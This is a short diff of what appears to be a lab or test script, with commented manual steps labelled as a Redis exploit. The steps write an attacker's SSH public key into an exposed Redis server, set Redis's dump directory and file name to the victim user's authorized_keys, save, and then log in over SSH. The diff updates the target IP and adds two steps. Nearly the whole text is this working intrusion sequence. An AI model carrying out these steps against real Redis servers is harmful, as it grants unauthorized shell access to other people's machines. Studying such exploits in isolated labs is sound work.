@@ -24,12 +24,15 @@ ssh-keygen -t rsa -f /root/.ssh/id_rsa -N ""
 cd .ssh
 (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > 1.txt
 
+# IP is target IP
 # ----------Redis exploit Steps that cannot be automated---------
-# cat 1.txt | redis-cli -h 172.17.0.3 -x set sshkey
-# redis-cli -h 172.17.0.3
+# cd ~/.ssh
+# cat 1.txt | redis-cli -h 172.18.0.2 -x set sshkey
+# redis-cli -h 172.18.0.2
 # keys *
 # config set dir /home/resch/.ssh
 # config set dbfilename "authorized_keys"
 # save
-# ssh -i ./id_rsa resch@172.17.0.3
+# exit
+# ssh -i ./id_rsa resch@172.18.0.2
 #------------------------------------------------------------------
